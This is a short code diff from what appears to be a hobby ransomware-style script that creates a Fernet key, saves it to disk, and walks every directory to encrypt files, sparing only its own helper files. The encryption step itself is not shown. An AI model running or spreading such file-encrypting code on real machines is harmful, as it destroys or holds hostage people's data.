@@ -16,16 +16,11 @@ key = Fernet.generate_key()
 with open("thekey.key","wb") as thekey:
 	thekey.write(key)
 
-
-#lets find some files 
-
-files = []
-
 # traversing all directories and subdirectories 
 for root, dirs, files in os.walk('.'):
 	for file in files:
 		# This is temporary. This is just to ensure that the important files do not get encrypted. 
-		if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":	#if file  is voldemort.py the dont add
+		if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "dryrun.py" or file == "README.md":	#if file  is voldemort.py the dont add
 			continue
 		# getting the full path of the file
 		file_path = os.path.join(root, file)
